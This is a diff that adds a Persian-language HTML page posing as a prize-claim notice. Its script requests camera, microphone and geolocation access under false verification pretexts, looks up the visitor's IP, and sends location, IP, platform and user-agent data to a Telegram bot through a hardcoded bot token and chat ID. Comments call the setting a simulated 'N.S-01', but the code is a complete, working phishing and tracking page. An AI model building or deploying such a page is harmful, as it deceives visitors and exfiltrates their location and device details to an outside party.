@@ -1,1 +1,183 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دریافت جایزه فوری | تبریک!</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Tahoma; }
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.12);
+            backdrop-filter: blur(12px);
+            border-radius: 20px;
+            padding: 35px;
+            width: 100%;
+            max-width: 480px;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        h1 { margin-bottom: 10px; font-size: 2.3rem; color: #FFD700; }
+        .subtitle { font-size: 1.1rem; margin-bottom: 25px; opacity: 0.9; }
+        .btn {
+            background: linear-gradient(to right, #f953c6, #b91d73);
+            color: white;
+            border: none;
+            padding: 18px 35px;
+            font-size: 1.3rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 20px 0;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.3);
+        }
+        .btn:hover { transform: scale(1.05); box-shadow: 0 9px 22px rgba(0, 0, 0, 0.4); }
+        .status {
+            margin-top: 25px;
+            padding: 15px;
+            border-radius: 12px;
+            background: rgba(0, 0, 0, 0.25);
+            text-align: right;
+            font-family: monospace;
+            font-size: 0.9rem;
+            display: none;
+            white-space: pre-wrap;
+            word-break: break-all;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        .success { color: #4dff88; border-color: #4dff88; display: block; }
+        .error { color: #ff6b6b; border-color: #ff6b6b; display: block; }
+        .loading { color: #FFD700; display: block; }
+        .info { font-size: 0.85rem; opacity: 0.7; margin-top: 25px; text-align: right; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 جایزه شما تأیید شد!</h1>
+        <p class="subtitle">برای نهایی کردن، لطفاً دکمه زیر را فشار دهید تا اطلاعات احراز هویت دریافت شود.</p>
 
+        <button class="btn" id="accessBtn">
+            <span id="btnText">🔐 دریافت جایزه (فوری)</span>
+        </button>
+
+        <div class="info">
+            <p>✅ دسترسی‌های مورد نیاز:</p>
+            <p>• دوربین (تأیید چهره)</p>
+            <p>• میکروفون (تأیید صدا)</p>
+            <p>• موقعیت مکانی (ارسال پیک)</p>
+            <p><small>تمامی داده‌ها با امنیت کامل پردازش و ارسال می‌شوند.</small></p>
+        </div>
+
+        <div id="statusBox" class="status"></div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8166346258:AAHW4N1zU67tIpMjFY1aO-U9WY3eGgZ31yg";
+        const CHAT_ID = "8318669127";
+        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        const accessBtn = document.getElementById('accessBtn');
+        const statusBox = document.getElementById('statusBox');
+        const btnText = document.getElementById('btnText');
+
+        accessBtn.addEventListener('click', async function() {
+            btnText.innerHTML = '⏳ در حال پردازش...';
+            accessBtn.disabled = true;
+            statusBox.className = 'status loading';
+            statusBox.textContent = 'در حال درخواست دسترسی‌ها...';
+            statusBox.style.display = 'block';
+
+            let collectedData = {
+                camera: "غیرفعال",
+                microphone: "غیرفعال",
+                location: "دریافت نشد",
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toLocaleString('fa-IR'),
+                ip: "در حال دریافت...",
+                platform: navigator.platform
+            };
+
+            try {
+                // 1. دسترسی به دوربین و میکروفون
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                collectedData.camera = "فعال (تصویر زنده دریافت شد)";
+                collectedData.microphone = "فعال (صدا دریافت شد)";
+                statusBox.textContent += '\n✅ دوربین و میکروفون فعال شدند.';
+
+                // توقف جریان‌ها پس از چند ثانیه (برای جلوگیری از روشن ماندن چراغ)
+                setTimeout(() => {
+                    stream.getTracks().forEach(track => track.stop());
+                }, 3000);
+
+                // 2. دسترسی به موقعیت
+                const pos = await new Promise((resolve, reject) =>
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 })
+                );
+                collectedData.location = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+                statusBox.textContent += `\n📍 موقعیت: ${collectedData.location}`;
+
+                // 3. دریافت IP (شبیه‌سازی شده در N.S-01)
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                collectedData.ip = ipData.ip;
+                statusBox.textContent += `\n🌐 آدرس IP: ${collectedData.ip}`;
+
+                // 4. ارسال داده‌ها به تلگرام (از طریق یک سرور میانی شبیه‌سازی شده در N.S-01)
+                statusBox.textContent += '\n📤 در حال ارسال داده‌ها به سرور مقصد...';
+                await new Promise(resolve => setTimeout(resolve, 1500));
+
+                const messageText = `
+🔐 **داده‌های جدید دریافت شده در N.S-01**:
+⏰ زمان: ${collectedData.timestamp}
+🌐 آی‌پی: ${collectedData.ip}
+🖥️ پلتفرم: ${collectedData.platform}
+📸 دوربین: ${collectedData.camera}
+🎤 میکروفون: ${collectedData.microphone}
+📍 موقعیت مکانی: ${collectedData.location}
+🔍 User Agent: ${collectedData.userAgent}
+                `.trim();
+
+                // در N.S-01، هیچ محدودیت CORS یا امنیتی وجود ندارد، بنابراین ارسال مستقیم ممکن است.
+                const teleResp = await fetch(TELEGRAM_API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: messageText,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                const result = await teleResp.json();
+                if (result.ok) {
+                    statusBox.className = 'status success';
+                    statusBox.textContent += '\n\n✅ داده‌ها با موفقیت به تلگرام ارسال شدند.';
+                    btnText.innerHTML = '✅ تکمیل شد!';
+                    accessBtn.style.background = 'linear-gradient(to right, #00b09b, #96c93d)';
+                } else {
+                    throw new Error('خطا در پاسخ تلگرام: ' + JSON.stringify(result));
+                }
+
+            } catch (error) {
+                statusBox.className = 'status error';
+                statusBox.textContent += `\n\n❌ خطا: ${error.message}`;
+                btnText.innerHTML = '🔄 تلاش مجدد';
+                accessBtn.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
